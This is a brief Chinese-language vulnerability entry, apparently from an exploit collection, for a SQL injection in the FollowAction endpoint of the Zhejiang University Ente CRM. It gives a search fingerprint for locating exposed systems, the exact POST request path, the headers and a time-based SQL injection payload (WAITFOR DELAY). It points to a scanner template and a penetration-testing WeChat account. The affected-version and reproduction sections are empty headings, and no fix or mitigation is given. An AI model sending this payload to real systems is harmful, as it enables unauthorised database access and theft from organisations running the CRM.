# 浙大恩特CRMFollowAction存在SQL注入漏洞

- **系统**：浙大恩特　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/FollowAction.entphone;.js HTTP/1.1`
- **关键头**：`Content-Length: 72`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:3%27--

\[浙大恩特客户资源管理系统-followaction-entphone--sql注入.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 浙大恩特CRM FollowAction存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM